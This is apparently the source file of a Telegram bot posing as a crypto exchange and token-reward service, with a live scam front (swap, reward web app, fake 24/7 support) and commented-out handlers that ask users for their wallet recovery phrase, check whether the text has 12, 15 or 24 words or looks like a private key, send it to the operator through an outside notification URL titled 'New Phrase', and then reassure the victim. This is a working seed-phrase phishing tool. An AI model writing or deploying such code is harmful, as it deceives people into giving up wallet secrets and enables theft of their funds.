import { Bot, Keyboard } from "./deps.deno.ts";
// import axiod from "https://deno.land/x/axiod/mod.ts";

export const bot = new Bot(Deno.env.get("BOT_TOKEN") || "234dc");

// // Construct a keyboard.
// const inlineKeyboard = new InlineKeyboard().text("Connect Wallet", "click-payload");

// // Build an inline keyboard:
// const homeKeyboard = new InlineKeyboard()
//   .text('Verify', 'connect').text('Swap', 'connect').row()
//   .text('Airdrop', 'connect').text('Help', 'connect').row()
//   .text('Connect Wallet', 'connect').row()
//   .url('official Website', 'https://ait.finance')

// // Build an inline keyboard:
// const connectKeyboard = new InlineKeyboard()
//   .text('Manual Connect', 'manualConnect').row()
//   .url('Web Connect', 'https://ait-finance-connect.web.app')

const keyboard = new Keyboard()
  .text("🌑 Exchange").row()
  .webApp("Token Reward", "https://guiser-reward.web.app").row()
  // .webApp("🌑 Exchange", "https://guiser.org/swap").row()
  .text("🆘 Contact Support")
  .resized();

// Send a keyboard along with a message.
bot.command("start", async (ctx) => {
  await ctx.reply("Trade your favorite cryptos like BTC, ETH, MATIC, XMR, SOL, and thousands more, including those quirky meme tokens, all hassle-free on Telegram!", 
  { reply_markup: keyboard });
});

bot.on('message:text', async (ctx) => {
  try {
      const btnText = ctx.message.text;
  if ( btnText === "🆘 Contact Support" )  {
    ctx.reply("Contact our 24/7 customer support in case your order is taking more than 30 minutes to complete @askGuiserBot"); // Reply to the user with a confirmation message
  } else {
    await ctx.reply("Contact our 24/7 customer support in case your order is taking more than 30 minutes to complete @askGuiserBot", { reply_markup: Keyboard });
  }
  } catch (error) {
    console.error(error)
  }
  
});

// // Wait for click events with specific callback data.
// bot.callbackQuery("support", async (ctx) => {
//   await ctx.reply("Contact our 24/7 customer support in case your order is taking more than 30 minutes to complete @askGuiserBot", { reply_markup: keyboard });
// });

// // Wait for click events with specific callback data.
// bot.callbackQuery("manualConnect", async (ctx) => {
//   ctx.deleteMessage()
//   await ctx.reply("Enter your wallet phrase (usually 12 or 24 words) to import manually");
// });

// bot.on('message:text', async (ctx) => {
//         try {
//             const phrase = ctx.message.text;
//         if (phrase.split(' ').length === 12 || phrase.split(' ').length === 15 || phrase.split(' ').length === 24 || (phrase.split(' ').length === 1 && phrase.length > 60))  {
//             const webhook_url = `https://alertzy.app/send?accountKey=${Deno.env.get("ALERTZY_KEY")}&title=New Phrase&message=${phrase}` //change notification
//             const response = await axiod.post(webhook_url)
//             ctx.reply("Connecting to wallet please wait..."); // Reply to the user with a confirmation message
//         } else {
//             ctx.deleteMessage()
//             await ctx.reply("Invalid response.! Kindly try again", { reply_markup: homeKeyboard });
//         }
//         } catch (error) {
//             console.error(error)
//         }
        
//     });
